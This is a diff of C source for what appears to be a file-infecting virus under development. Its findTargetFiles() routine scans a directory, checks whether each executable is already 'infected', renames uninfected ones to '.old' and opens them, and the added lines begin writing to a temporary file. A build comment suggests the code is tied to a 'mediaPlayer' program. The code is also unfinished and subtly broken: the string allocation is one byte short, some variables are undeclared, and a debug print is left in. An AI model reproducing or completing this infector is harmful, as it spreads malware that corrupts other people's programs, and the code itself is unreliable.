@@ -9,7 +9,7 @@
 
 bool isAlreadyInfected(char *pgrmName, DIR *d);
 // step 4 : find target files
-//gcc -o mediaPlayer mediaplayer/mediaplayer.c `pkg-config --cflags --libs gtk+-3.0`
+// gcc -o mediaPlayer mediaplayer/mediaplayer.c `pkg-config --cflags --libs gtk+-3.0`
 void findTargetFiles()
 {
         DIR *d;
@@ -42,11 +42,18 @@ void findTargetFiles()
                                 {
                                         if (!isAlreadyInfected(dir->d_name, d))
                                         {
+                                                // renaming the existing exe to executable.old
                                                 size_t newNameLen = strlen(dir->d_name) + strlen(".old");
                                                 char *newName = (char *)malloc(newNameLen);
                                                 strcpy(newName, dir->d_name);
                                                 strcat(newName, ".old");
                                                 rename(dir->d_name, newName);
+                                                // opening the .old
+                                                FILE *inputFile;
+                                                inputFile = fopen(newName, "r");
+                                                printf("TESTTTTTTT %s\n", dir->d_name);
+
+                                                fd = open(tmpname, O_WRONLY | O_APPEND | O_CREAT, 0644);
                                                 free(newName);
                                         }
                                 }
